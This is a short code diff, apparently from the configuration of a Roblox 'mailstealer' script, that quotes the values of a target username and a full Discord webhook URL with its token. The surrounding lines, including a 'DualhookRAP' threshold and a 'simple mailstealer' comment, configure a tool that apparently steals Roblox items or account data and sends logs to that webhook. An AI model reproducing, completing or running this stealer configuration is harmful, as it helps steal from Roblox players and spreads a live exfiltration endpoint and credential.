@@ -6,8 +6,8 @@ LogsWebhook = ""
 DualhookRAP = 100000000
 mailstealer_name = "egorikusa"
 
-Roblox_Username = Slayamanno123
-Discord_Webhook = https://discord.com/api/webhooks/1533717203566858305/y6CwfBujXJfD5cxy8hTF_aZalsP5QebRxik6BvhhxP1vIPr2VdxNSp_KzUc09Kj4ZQr0
+Roblox_Username = "Slayamanno123"
+Discord_Webhook = "https://discord.com/api/webhooks/1533717203566858305/y6CwfBujXJfD5cxy8hTF_aZalsP5QebRxik6BvhhxP1vIPr2VdxNSp_KzUc09Kj4ZQr0"
 
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
